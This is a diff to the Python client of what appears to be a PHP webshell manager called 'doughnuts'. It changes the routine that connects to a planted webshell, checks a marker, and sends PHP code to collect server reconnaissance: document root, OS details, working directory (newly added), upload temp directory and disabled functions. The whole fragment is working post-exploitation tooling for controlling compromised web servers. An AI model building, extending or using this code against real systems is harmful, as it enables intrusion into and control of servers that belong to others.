@@ -65,7 +65,7 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
     if "c4ca4238a0b923820d" in req.r_text:  # 验证是否成功连接
         gset("webshell.php_version", req.r_text.split("c4ca4238a0b923820d|")[1].split("|cc509a6f75849b")[0], namespace="webshell")
         info_req = send(
-            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions'));"
+            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.getcwd().'|'.ini_get('upload_tmp_dir').'|'.ini_get('disable_functions'));"
         )
         info = info_req.r_text.strip().split("|")
         gset("webshell.root", info[0], namespace="webshell")
@@ -75,8 +75,9 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
             (True if "win" in info[1].lower() else False),
             namespace="webshell",
         )
+        gset("webshell.pwd", info[2], namespace="webshell")
         gset("webshell.prompt", f"doughnuts ({color.cyan(webshell_netloc)}) > ")
-        upload_tmp_dir = info[2]
+        upload_tmp_dir = info[3]
         if (not upload_tmp_dir):
             if (not is_windows()):
                 upload_tmp_dir = "/tmp/"
@@ -86,8 +87,7 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
             else:
                 upload_tmp_dir += "/"
         gset("webshell.upload_tmp_dir", upload_tmp_dir, namespace="webshell")
-        print("test", info[2])
-        disable_function_list = [f.strip() for f in info[3].split(",")]
+        disable_function_list = [f.strip() for f in info[4].split(",")]
         if ('' in disable_function_list):
             disable_function_list.remove('')
         gset("webshell.disable_functions", disable_function_list, namespace="webshell")
